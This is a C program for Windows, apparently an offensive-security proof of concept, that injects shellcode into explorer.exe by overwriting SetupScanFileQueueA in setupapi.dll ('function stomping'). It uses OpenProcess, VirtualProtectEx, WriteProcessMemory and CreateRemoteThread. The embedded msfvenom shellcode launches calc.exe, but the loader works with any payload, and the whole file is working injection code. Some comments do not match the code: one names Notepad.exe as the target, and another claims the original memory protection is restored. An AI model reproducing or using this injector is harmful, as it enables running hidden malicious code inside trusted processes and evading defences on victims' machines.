#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

//Function for enumerating the process ID. By default, it targets [explorer.exe]
DWORD getPID() {

	printf("[*] Enumerating the PID of the target process..\n");

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to take snapshot. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Snapshot taken successfully.\n");

	PROCESSENTRY32 pe32 = { 0 };
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(hSnapshot, &pe32) == TRUE) {
		while (Process32Next(hSnapshot, &pe32) == TRUE) {
			if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {   //change the process name to whatever process you want to target.
				return pe32.th32ProcessID;
				break;
			}
		}
	}
}

int main() {

	DWORD PID = getPID();
	printf("[*] PID of the target process [Notepad.exe] is %ld\n", PID);

  //shellcode of calc.exe generated using msfvenom
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	DWORD oldprotect = 0;
	DWORD TID = NULL;

  //The sacrificial process that we are targeting is SetupScanFileQueueA which is loaded by setupapi.dll so we need to load that DLL first inorder to get the address of our target function.
	HMODULE hModule = LoadLibraryA("setupapi.dll");
	if (hModule == NULL) {
		printf("[!] Failed to load setupapi.dll. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] setupapi.dll Loaded.\n");

	PVOID pAddress = GetProcAddress(hModule, "SetupScanFileQueueA");
	if (pAddress == NULL) {
		printf("[!] Failed to get the address of function [SetupScanFileQueueA]. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Found the address of function [SetupScanFileQueueA]\n\t\\----0x%p\n", pAddress);

	Sleep(240);

	printf("[*] Attempting to overwrite the function address.\n");

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		printf("[!] Failed to get an handle to target process. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle to target process.\n");

	if (!VirtualProtectEx(hProcess, pAddress, sizeof(pAddress), PAGE_READWRITE, &oldprotect)) {
		printf("[!] Failed to change the memory protection of function address. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Changed the memory protection to PAGE_READWRTE.\nAttempting to overwrite..\n");

	if (!WriteProcessMemory(hProcess, pAddress, shellcode, sizeof(shellcode), NULL)) {
		printf("[!] Failed to overwrite the function address. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Successfully overwrote the function address.\n");

	if (!VirtualProtectEx(hProcess, pAddress, sizeof(pAddress), PAGE_EXECUTE_READWRITE, &oldprotect)) {
		printf("[!] Failed to change the memory protection to its original state. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Memory protection changed from PAGE_READWRITE to PAGE_EXECUTE_READWRITE.\n");

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, 0, &TID);
	if (hThread == NULL) {
		printf("[!] Failed to create a remote thread. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Created a remote thread. TID: %ld\n", TID);
	printf("[+] Shellcode executed successfully.\n");

	WaitForSingleObject(hThread, INFINITE);

	printf("[*] Cleaning up..\n");

	CloseHandle(hProcess);
	CloseHandle(hThread);

	return EXIT_SUCCESS;

}
